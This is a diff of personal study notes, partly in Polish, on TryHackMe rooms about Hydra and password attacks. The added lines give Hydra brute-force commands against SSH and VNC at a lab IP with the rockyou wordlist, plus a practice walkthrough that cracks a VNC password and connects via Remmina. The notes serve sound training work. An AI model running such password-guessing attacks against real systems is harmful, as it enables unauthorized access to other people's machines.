@@ -1,6 +1,9 @@
 # Rooms
 1. Aoc2022: https://tryhackme.com/room/adventofcyber4
 2. Hydra: https://tryhackme.com/room/hydra
+3. Protocols and Servers https://tryhackme.com/room/protocolsandservers2
+4. Passwords attacks: https://tryhackme.com/room/passwordattacks
+5. John The Ripper: https://tryhackme.com/room/johntheripper0
 
 # Wordlist and Tools: 
 
@@ -23,9 +26,14 @@
 ```nmap
 hydra -l username -P wordlist-passwords.txt server-IP service
 hydra -L wordlist-usernames -P wordlist-passwords.txt server-IP service
-#równoważne przykłady
+#równoważne przykłady 
+# SSH
 hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.40.141 ssh
 hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.40.141
+
+#VNC - nie używa nazwy użytkownika
+hydra -P wordlist-passwords.txt server-IP service
+hydra -P /usr/share/wordlists/rockyou.txt 10.10.40.141 vnc
 ```
 `mark ` as the username as it iterates over the provided passwords against the SSH server.
 **Others porotcoles** : rdp, vnc, ftp, pop3
@@ -75,16 +83,25 @@ Support for protools: ` SSH, VNC, FTP, POP3, IMAP, SMTP,`
 
 
 
-<details>
-<summary>Practice</summary>
+# PRACTISE - THM
 
+## 5.1. Użycie Hydry do brute-forca hasła dla usługi VNC. 
 
-  
-  
-</details>
+```
+hydra -P /usr/share/wordlists/rockyou.txt 10.10.40.141 vnc
+```
 
+![obraz](https://user-images.githubusercontent.com/90008283/205737156-2bf59c80-3263-4e60-9d30-24f18301bddf.png)
 
+## 5.2. Połączenie się prze VNC do pulpitu zdalnego. - REMMINA
 
+`Application -> Internet -> Remmina` 
+
+![obraz](https://user-images.githubusercontent.com/90008283/205737850-63d60a05-89cd-4c38-b961-4dd8e018e153.png)
+
+![obraz](https://user-images.githubusercontent.com/90008283/205738115-56a17863-b283-482a-8aba-d471c437e03c.png)
+
+![obraz](https://user-images.githubusercontent.com/90008283/205738394-0c63a341-ad8e-4b05-82fc-3112efa215ab.png)
 
 
 
